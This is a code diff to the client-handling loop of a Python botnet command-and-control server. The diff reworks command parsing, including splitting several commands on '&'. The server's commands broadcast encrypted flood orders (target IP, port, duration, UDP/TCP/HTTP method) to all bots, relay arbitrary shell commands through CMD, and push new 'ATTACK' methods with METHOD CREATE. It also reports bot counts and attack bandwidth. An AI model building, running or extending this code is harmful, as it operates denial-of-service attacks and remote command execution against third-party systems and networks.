@@ -47,7 +47,7 @@ class Client():
     ) -> None:
         self.log(f"send {data}")
 
-        for relay in self.config.relay_list.keys():
+        for relay in self.config.relay_list.copy().keys():
             try: self.send(relay, f'{data}', False, False)
             except Exception:
                 self.config.relay_list.pop(relay)
@@ -104,22 +104,35 @@ class Client():
 
         self.send(client, self.prompt(username, False), False)
 
+        command_list: list[str] = []
         while 1:
             try:
                 data: str = client.recv(1024).decode().strip()
 
                 if not data: continue
+                # few commands in one line impl:
+                if "&" in data:
+                    data_split = data.split("&")
+                    data = data_split[0]
+                    for cmd in data_split:
+                        command_list.append(cmd)
+                else: command_list.append(data)
 
-                args: list[str] = data.split(' ')
-                command: str = args[0].upper()
-                cmd: str = data
 
-                is_command: bool = False
+                for data in command_list:
+                    # remove every spaces in start or end of the command
+                    while data.startswith(" "):
+                        data = data[1:]
+                    while data.endswith(" "):
+                        data = data[:-1]
 
-                match command:
-                    case 'HELP':
-                        is_command = True
-                        tab: str = Colorate.Vertical(Colors.yellow_to_red, """
+                    args: list[str] = data.split(' ')
+                    command: str = args[0]
+                    cmd: str = data
+
+                    match command.upper():
+                        case 'HELP':
+                            tab: str = Colorate.Vertical(Colors.yellow_to_red, """
         ╔═══════════════╦══════════════════════════════════════════╗
         ║  HELP         ║   Shows list of commands                 ║
         ╠═══════════════╬══════════════════════════════════════════╣
@@ -140,126 +153,87 @@ class Client():
         ║  LOGOUT       ║   Disconnects from CnC server            ║
         ╚═══════════════╩══════════════════════════════════════════╝
 
-                        """, 1)
-                        for x in tab.split("\n"):
-                            self.send(client, x)
+                            """, 1)
+                            for x in tab.split("\n"):
+                                self.send(client, x)
 
-                    case 'CLEAR':
-                        is_command = True
+                        case 'CLEAR':
+                            self.send(client, self.config.ANSI_CLEAR, False)
+                            for x in self.config.banner.split('\n'):
+                                self.send(client, x)
 
-                        self.send(client, self.config.ANSI_CLEAR, False)
-                        for x in self.config.banner.split('\n'):
-                            self.send(client, x)
+                            self.send(client, "\n")
+                            self.send(client, self.prompt(f"Bots: {bot_number}"))
+                            self.send(client, self.prompt(f"Relays: {relay_number}"))
+                            self.send(client, self.prompt(f"Speed: {total_speed} Gbps"))
+                            self.send(client, "\n")
 
-                        self.send(client, "\n")
-                        self.send(client, self.prompt(f"Bots: {bot_number}"))
-                        self.send(client, self.prompt(f"Relays: {relay_number}"))
-                        self.send(client, self.prompt(f"Speed: {total_speed} Gbps"))
-                        self.send(client, "\n")
-
-                    case 'LOGOUT':
-                        self.send(client, 'Goodbye')
-                        sleep(1)
-                        break
-                    
-                    case "CMD":
-                        is_command = True
-
-                        if len(args) == 1: self.send(client, self.prompt(f"CMD need <command> argument!"))
-                        else:
-                            relay_cmd: str = data
-                            self.broadcast(
-                                self.crypt(relay_cmd.encode(), True)
-                            )
-
-                    case "SPEED":
-                        is_command = True
-
-                        try:
-                            Loops(config=self.config)._net()
-                            self.send(client, f"{total_speed} Gbps")
-
-                        except Exception as e: self.send(client, f"{self.config.COLOR_RED}[{self.config.COLOR_WHITE}!{self.config.COLOR_RED}]{self.config.COLOR_RESET} Error: {e}")
-
-                    case "BOTS":
-                        is_command = True
-
-                        try:
-                            Loops(config=self.config)._getbot()
-                            self.send(client, f"{bot_number} Bots")
-
-                        except Exception as e: self.send(client, self.prompt(f"Error: {e}"))
-
-                    case "PING":
-                        is_command = True
-
-                        Loops(config=self.config)._ping()
-
-                    case "METHOD":
-                        is_command = True
-
-                        try:
-                            if len(args) == 1: self.send(client, self.prompt(f"METHOD need <name> arguments!"))
+                        case 'LOGOUT':
+                            self.send(client, 'Goodbye')
+                            sleep(1)
+                            return
+                        
+                        case "CMD":
+                            if len(args) == 1: self.send(client, self.prompt(f"CMD need <command> argument!"))
                             else:
-                                method_arg = data.replace("METHOD ", "")
-                                method_args = method_arg.split(" ")
+                                relay_cmd: str = cmd
+                                self.broadcast(
+                                    self.crypt(relay_cmd.encode(), True)
+                                )
 
-                                if method_args[0] == 'CREATE':
-                                    if len(args) < 4: self.send(client, self.prompt(f"METHOD CREATE need <name> and <command> arguments!"))
-                                    else:
-                                        self.broadcast(
-                                            self.crypt(cmd.encode())
-                                        )
-                                        name = method_args[1]
-                                        method_cmd = method_arg.replace("CREATE ", "").replace(f"{name} ", "")
+                        case "SPEED":
+                            try:
+                                Loops(config=self.config)._net()
+                                self.send(client, f"{total_speed} Gbps")
 
-                                        with open("method.json", "r") as f:
-                                            tb1: str = load(f)
-                                            tb1 = tb1.replace('{"', '"').replace("{}", "").replace("}    ", "") # here i remind that spaces are useful
-                                            tb = f'"{name}": {{"name": "{name}", "command": "{method_cmd}"}}'
+                            except Exception as e: self.send(client, f"{self.config.COLOR_RED}[{self.config.COLOR_WHITE}!{self.config.COLOR_RED}]{self.config.COLOR_RESET} Error: {e}")
 
-                                        if not tb1 is None: tb="{"+tb1+",\n"+tb+"\n}    "
-                                        else: tb = "{"+tb+"\n}    "
+                        case "BOTS":
+                            try:
+                                Loops(config=self.config)._getbot()
+                                self.send(client, f"{bot_number} Bots")
 
-                                        tb = tb.replace("{{", "{").replace("}}", "}")
+                            except Exception as e: self.send(client, self.prompt(f"Error: {e}"))
 
-                                        with open("method.json", "w") as f:
-                                            f.write(tb.replace("'", '"').replace("{,", "{"))
+                        case "PING": Loops(config=self.config)._ping()
 
+                        case "METHOD":
+                            try:
+                                if len(args) == 1: self.send(client, self.prompt(f"METHOD need <name> arguments!"))
                                 else:
-                                    self.broadcast(
-                                        self.crypt(method_cmd.encode())
-                                    )
-                                    self.send(client, self.prompt(f"Command {method_args[0]} send to all bots!"))
+                                    method_arg = cmd.replace("METHOD ", "")
+                                    method_args = method_arg.split(" ")
 
-                        except Exception as e: self.send(client, self.prompt(f"Error: {e}"))
+                                    match method_args[0].upper():
+                                        case 'CREATE':
+                                            if len(args) < 4: self.send(client, self.prompt(f"METHOD CREATE need <name> and <command> arguments!"))
+                                            else:
+                                                self.broadcast(
+                                                    self.crypt(cmd.encode())
+                                                )
+                                                name = method_args[1]
+                                                method_cmd = method_arg.replace("CREATE ", "").replace(f"{name} ", "")
 
-                    case "METHODS":
-                        is_command = True
+                                                with open("method.json", "r") as f:
+                                                    tb1: str = load(f)
+                                                    tb1 = tb1.replace('{"', '"').replace("{}", "").replace("}    ", "") # here i remind that spaces are useful
+                                                    tb = f'"{name}": {{"name": "{name}", "command": "{method_cmd}"}}'
 
-                        methods_arg: str = data.replace("METHOD ", "")
-                        methods_args = methods_arg.split(" ")
+                                                if not tb1 is None: tb="{"+tb1+",\n"+tb+"\n}    "
+                                                else: tb = "{"+tb+"\n}    "
 
-                        name: str = methods_args[0]
+                                                tb = tb.replace("{{", "{").replace("}}", "}")
 
-                        if path.exists("method.json"):
-                            with open("method.json", "r") as f:
-                                data = load(f)
-                                for (key, val) in data.items():
-                                    self.send(client, f"{key}: {val['command']}")
+                                                with open("method.json", "w") as f:
+                                                    f.write(tb.replace("'", '"').replace("{,", "{"))
 
-                        else:
-                            with open("method.json", "w") as f:
-                                f.write("{}")
-                            self.send(client, self.prompt(f"Nothing found"))
-
-                if cmd == "METHOD CLEAR":
-                    self.broadcast(cmd)
-                    with open("method.json", "w") as f:
-                        f.write("{}")
-                
-                elif cmd == "METHOD HELP":
-                    tab: str = Colorate.Vertical(Colors.yellow_to_red, """
+                                        case 'CLEAR':
+                                            self.broadcast(cmd)
+                                            with open("method.json", "w") as f:
+                                                f.write("{}")
+                                                
+                                        case 'HELP':
+                                            tab: str = Colorate.Vertical(Colors.yellow_to_red, """
         ╔══════════════════╦══════════════════════════════════════════╗
         ║  METHOD CREATE   ║   Send a new ATTACK method to all bots   ║
         ╠══════════════════╬══════════════════════════════════════════╣
@@ -270,42 +244,67 @@ class Client():
         ║  METHODS         ║   List all methods                       ║
         ╚══════════════════╩══════════════════════════════════════════╝
 
-                    """, 1)
-                    for x in tab.split("\n"):
-                        self.send(client, x)
+                                            """, 1)
+                                            for x in tab.split("\n"):
+                                                self.send(client, x)
+                                                
+                                        case _:
+                                            self.broadcast(
+                                                self.crypt(method_cmd.encode())
+                                            )
+                                            self.send(client, self.prompt(f"Command {method_args[0]} send to all bots!"))
 
-                elif cmd.startswith("ATTACK"):
-                    try:
-                        attack_arg: str = cmd.replace("ATTACK", "")
-                        attack_args: list[str] = attack_arg.split(" ")
+                            except Exception as e: self.send(client, self.prompt(f"Error: {e}"))
 
-                        if len(attack_args) < 4: self.send(client, self.prompt(f"ATTACK need <ip> <port> <attack time> <UDP or TCP or HTTP> arguments!"))
+                        case "METHODS":
+                            methods_arg: str = cmd.replace("METHOD ", "")
+                            methods_args = methods_arg.split(" ")
 
-                        else:
-                            attack_ip: str = attack_args[0]
-                            attack_port: str = attack_args[1]
-                            tps: str = attack_args[2]
-                            method: str = attack_args[3]
-                            attack_cmd: str = f"{attack_ip}:{attack_port}/{tps}-{method}"
+                            name: str = methods_args[0]
 
-                            self.broadcast(
-                                self.crypt(attack_cmd.encode())
-                            )
-                            Loops(config=self.config)._net()
+                            if path.exists("method.json"):
+                                with open("method.json", "r") as f:
+                                    d: str = load(f)
+                                    for (key, val) in d.items():
+                                        self.send(client, f"{key}: {val['command']}")
 
-                            self.send(client, self.prompt(f"Bots: {bot_number}", 1))
-                            self.send(client, self.prompt(f"Attack IP: {attack_ip}", 1))
-                            self.send(client, self.prompt(f"Attack Port: {attack_port}", 1))
-                            self.send(client, self.prompt(f"Attack Time: {tps}", 1))
-                            self.send(client, self.prompt(f"Attack Method: {method}", 1))
-                            self.send(client, self.prompt(f"Attack Speed: {total_speed} Gbps", 1))
-                            self.send(client, "\n")
+                            else:
+                                with open("method.json", "w") as f:
+                                    f.write("{}")
+                                self.send(client, self.prompt(f"Nothing found"))
 
-                    except Exception as e: self.send(client, self.prompt(f"Attack Error: {e}"))
+                        case 'ATTACK':
+                            try:
+                                attack_arg: str = cmd.replace("ATTACK ", "")
+                                attack_args: list[str] = attack_arg.split(" ")
 
-                else:
-                    if not is_command: self.send(client, self.prompt("Unknown Command"))
+                                if len(attack_args) < 4: self.send(client, self.prompt(f"ATTACK need <ip> <port> <attack time> <UDP or TCP or HTTP> arguments!"))
 
+                                else:
+                                    attack_ip: str = attack_args[0]
+                                    attack_port: str = attack_args[1]
+                                    tps: str = attack_args[2]
+                                    method: str = attack_args[3]
+                                    attack_cmd: str = f"{attack_ip}:{attack_port}/{tps}-{method}"
+
+                                    self.broadcast(
+                                        self.crypt(attack_cmd.encode())
+                                    )
+                                    Loops(config=self.config)._net()
+
+                                    self.send(client, self.prompt(f"Bots: {bot_number}", 1))
+                                    self.send(client, self.prompt(f"Attack IP: {attack_ip}", 1))
+                                    self.send(client, self.prompt(f"Attack Port: {attack_port}", 1))
+                                    self.send(client, self.prompt(f"Attack Time: {tps}", 1))
+                                    self.send(client, self.prompt(f"Attack Method: {method}", 1))
+                                    self.send(client, self.prompt(f"Attack Speed: {total_speed} Gbps", 1))
+                                    self.send(client, "\n")
+
+                            except Exception as e: self.send(client, self.prompt(f"Attack Error: {e}"))
+
+                        case _: self.send(client, self.prompt("Unknown Command"))
+
+                command_list.clear()
                 self.send(client, self.prompt(username, False), False)
 
             except Exception as e: 
